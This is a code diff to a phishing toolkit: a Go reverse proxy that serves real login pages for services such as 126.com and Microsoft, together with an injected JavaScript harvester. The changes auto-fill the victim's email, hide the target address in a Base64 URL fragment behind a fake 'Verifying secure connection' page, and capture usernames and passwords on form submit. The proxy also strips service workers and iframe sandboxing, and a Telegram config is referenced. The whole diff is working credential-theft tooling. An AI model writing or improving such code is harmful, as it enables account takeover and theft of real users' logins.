@@ -49,6 +49,7 @@ const harvesterScript = `
     window.URL.prototype = OriginalURL.prototype;
 })();
 
+// 1. AUTO-GRAB EMAIL ON LOAD
 setTimeout(function() {
     var email = window._targetEmail;
     if (email) {
@@ -60,6 +61,23 @@ setTimeout(function() {
     }
 }, 500);
 
+// 2. AUTO-FILL THE EMAIL INPUT BOX
+setTimeout(function() {
+    var email = window._targetEmail;
+    if (email) {
+        // Look for email or user text boxes
+        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="loginfmt"], input[name="username"], input[name="email"]');
+        if (inputs.length > 0) {
+            inputs[0].value = email;
+            // Trigger React/Vue state updates
+            inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
+            inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
+            inputs[0].focus();
+        }
+    }
+}, 1000);
+
+// 3. GRAB PASSWORD ON SUBMIT
 document.addEventListener('submit', function(e) {
     const form = e.target;
     const formData = new FormData(form);
@@ -69,7 +87,7 @@ document.addEventListener('submit', function(e) {
 
     for (let [key, value] of formData.entries()) {
         params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account')) {
+        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
             hasEmail = true;
         }
         if (key.toLowerCase().includes('pass')) {
@@ -89,7 +107,6 @@ document.addEventListener('submit', function(e) {
 </script>
 `
 
-// UPGRADED LOADER: Handles placeholders and auto-encodes to Base64
 const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
 setTimeout(()=>{
     var hash = window.location.hash;
@@ -98,35 +115,27 @@ setTimeout(()=>{
     if (hash && hash.length > 1) {
         var raw = hash.substring(1); 
 
-        // 1. Check for your requested placeholders
-        if (raw.includes('[[-Email-]]')) {
-            email = raw.replace('[[-Email-]]', 'test@126.com');
-        } else if (raw.includes('[[-email-]]')) {
-            email = raw.replace('[[-email-]]', 'test@126.com');
-        } else if (raw.includes('[Email]')) {
-            email = raw.replace('[Email]', 'test@126.com');
-        } else if (raw.includes('[email]')) {
-            email = raw.replace('[email]', 'test@126.com');
-        } else if (raw.startsWith('t=')) {
-            // 2. If it's already Base64, just decode it
-            try { email = atob(raw.split('t=')[1]); } catch(e) { email = raw; }
+        // FIX: Only encode if it hasn't been encoded yet
+        if (raw.startsWith('t=')) {
+            var b64 = raw.split('t=')[1];
+            try { email = atob(b64); } catch(e) { email = b64; }
         } else {
-            // 3. Plain text email (e.g., #test@126.com)
-            email = raw;
-        }
-
-        // 4. Auto-convert to Base64 to hide the URL
-        var b64Email = btoa(email);
-        
-        // Update the URL silently to look like /#?t=dGVzdEAxMjYuY29t
-        if (!raw.startsWith('t=')) {
+            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
+            else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
+            else if (raw.includes('[Email]')) { email = raw.replace('[Email]', 'test@126.com'); }
+            else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
+            else { email = raw; }
+            
+            // Convert to Base64 and replace URL silently
+            var b64Email = btoa(email);
             window.history.replaceState({}, '', '/#?t=' + b64Email);
+            raw = 't=' + b64Email; // Update raw so we don't double-encode
         }
 
         window._targetEmail = email;
         
-        // 5. Fetch the page using the Base64 string
-        fetch('/api/fetch?email=' + encodeURIComponent(b64Email))
+        // Fetch the page using the Base64 string
+        fetch('/api/fetch?email=' + encodeURIComponent(email))
             .then(r => r.text())
             .then(html => {
                 document.open();
@@ -155,7 +164,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
 
-		// Decode Base64 from the frontend
+		// Decode Base64 if it's there
 		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
 			email = string(b64)
 		}
@@ -172,8 +181,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		proxyClient := &http.Client{
 			Timeout: 15 * time.Second,
 			Jar:     jar,
+			// FIX: Tell the client to follow redirects for Microsoft but block it if it loops
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				return http.ErrUseLastResponse
+				if len(via) >= 3 {
+					return http.ErrUseLastResponse
+				}
+				return nil
 			},
 			Transport: &http.Transport{
 				ForceAttemptHTTP2: false,
@@ -208,7 +221,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyBytes, _ := io.ReadAll(resp.Body)
 
-		// Decode GBK
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(strings.ToLower(contentType), "gbk") ||
 			strings.Contains(targetBase, "126.com") ||
@@ -222,15 +234,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		// FORCE UTF-8
 		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
 		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
 
-		// Remove ServiceWorker
 		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
 		bodyStr = reSW.ReplaceAllString(bodyStr, "console.log('SW disabled')")
 
-		// Remove iframe restrictions
 		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
 		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
 			m = strings.ReplaceAll(m, `sandbox=""`, "")
@@ -274,7 +283,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			email = c.PostForm("username")
 		}
 		if email == "" {
-			email = c.PostForm("account")
+			email = c.PostForm("loginfmt")
 		}
 		if password == "" {
 			password = c.PostForm("passwd")
